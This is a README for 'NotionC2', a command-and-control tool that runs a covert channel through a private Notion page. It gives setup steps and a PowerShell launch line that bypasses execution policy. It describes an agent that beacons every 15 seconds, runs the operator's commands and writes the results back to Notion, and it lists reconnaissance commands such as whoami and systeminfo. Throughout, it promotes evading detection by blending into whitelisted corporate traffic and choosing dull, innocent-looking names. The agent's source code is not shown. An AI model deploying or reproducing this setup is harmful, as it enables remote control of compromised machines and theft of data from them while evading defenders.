# NotionC2 🔴⚡

---




https://github.com/user-attachments/assets/b3d23c8d-7eaa-4a35-8922-e9d84c3b2f5c



---

## Working…………

![deepseek_mermaid_20251124_781bb7.png](Notion%20C2/deepseek_mermaid_20251124_781bb7.png)

## 🚀 Features

- Zero VPS, zero redirectors, zero cost
- Fully blends into corporate Notion traffic (whitelisted everywhere)
- Private page only – no public sharing needed
- Supports PowerShell, Python, and future Go/Nim agents
- Automatic output chunking (beats Notion’s 2000-char limit)
---

## 🧪 How It Works

1. You create a **private Notion page** with two lines:
`PENDING:` ← you type commands here
`RESULTS:` ← agent appends output here
    
    EXAMPLE: 
    
    `PENDING: dir`
    
2. Your **integration token** gives read/write access via API
3. Agent beacons every 15s, grabs command, executes, writes result back.

---

## 🖥️  Setup……………

### 📒 Create the Notion page

1. New page → name it “Meeting Notes 2025” or whatever
2. Add two paragraph blocks:

```
PENDING:
RESULTS:
```

1. Copy the page URL → extract the 32-char ID after the last -
    
    `EXAMPLE: xxxx24093e79803c8xxxxxxxxxxxxxxx`
    
    ![1.png](Notion%20C2/1.png)
    

---

### 🧩 Create Integration

1. Go to [https://www.notion.so/my-integrations](https://www.notion.so/my-integrations)
2. “New integration” → name it “SyncBot” or anything boring
3. Copy the **Internal Integration Token/NOTION TOKEN.** (secret_XXXXXXXXXXXXXXXXX)

![Screenshot 2025-11-24 at 12.18.33 PM.png](Notion%20C2/Screenshot_2025-11-24_at_12.18.33_PM.png)

---

**Give access to your pages.**

![Screenshot 2025-11-24 at 12.19.07 PM.png](Notion%20C2/Screenshot_2025-11-24_at_12.19.07_PM.png)

---

### ⚡ Run the Team server (optional) [n2server.py](http://n2server.py/)

```powershell
# n2server.py paste your NOTION token and page id ....
NOTION_TOKEN = "secret_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
PAGE_ID  = "xxxx24093e79803c8061c9xxxxxxxxxx"
```

```python
python3 n2server.py
```

![2.png](Notion%20C2/2.png)

---

### 📡 Deploy the Agent

**PowerShell Agent - Windows** 

```python
# agent.ps1 paste your secret token and page id ....
$token = "secret_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
$page  = "xxxx24093e79803c8061c9xxxxxxxxxx"
```

---

## 🧨 Run:

```powershell
powershell -ep bypass -f agent.ps1
```

## 🔥 Example Commands

```powershell
PENDING: whoami
PENDING: systeminfo
PENDING: Get-NetIPAddress
PENDING: dir C:\Users
PENDING: ipconfig
```

---

## 🛠️ RESULTS

### 🤖 Agent:

![Screenshot 2025-11-24 at 12.02.47 PM.png](Notion%20C2/Screenshot_2025-11-24_at_12.02.47_PM.png)

### 📄 Notion C2

![Screenshot 2025-11-24 at 12.05.48 PM.png](Notion%20C2/Screenshot_2025-11-24_at_12.05.48_PM.png)

---

![Screenshot 2025-11-24 at 1.04.10 PM.png](Notion%20C2/Screenshot_2025-11-24_at_1.04.10_PM.png)

---

![Screenshot 2025-11-24 at 1.04.03 PM.png](Notion%20C2/Screenshot_2025-11-24_at_1.04.03_PM.png)

---

---
